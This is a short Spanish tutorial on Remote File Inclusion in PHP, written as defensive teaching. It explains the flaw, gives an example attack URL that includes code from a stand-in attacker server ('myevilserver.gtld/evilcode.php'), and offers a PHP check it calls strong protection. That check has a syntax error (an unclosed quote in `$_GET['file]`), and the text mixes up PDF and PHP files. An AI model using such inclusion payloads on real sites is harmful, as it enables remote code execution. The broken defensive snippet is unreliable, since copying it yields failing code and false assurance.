---
title: Remote File Inclusion
localeTitle: La inclusión de archivos remotos
---
## Inclusión remota de archivos

Una vulnerabilidad en la aplicación causada por el programador que requiere una entrada de archivo provista por el usuario y no la desinfecta antes de acceder al archivo solicitado. Esto da como resultado que un archivo se extraiga de un servidor remoto y se incluya donde no debería haber estado.

### Ejemplo de ataques de inclusión de archivos remotos

Un sitio web le permite ver los archivos PDF como `download.php?file=myfile.php` , debido a la falta de verificación adecuada, un usuario malintencionado puede solicitar un recurso remoto e incluirlo en el script. La URL podría convertirse en `download.php?file=http://myevilserver.gtld/evilcode.php` esto podría enviarse al usuario o, en casos graves, ejecutar el código PHP real en su servidor.

### Defendiendo su sitio web de ataques de inclusión de archivos remotos en PHP

El siguiente código PHP proporcionará una fuerte protección contra ataques de inclusión de archivos remotos

```PHP
<?php 
 if(basename($_GET['file]) !== $_GET['file']) { 
  die('INVALID FILE REQUESTED'); 
 } 
```

*   Puede deshabilitar `allow_url_fopen` en su archivo php.ini como una protección adicional contra la inclusión de archivos remotos.

#### Más información:

*   [Wiki de OWASP - Pruebas para la inclusión remota de archivos](https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion)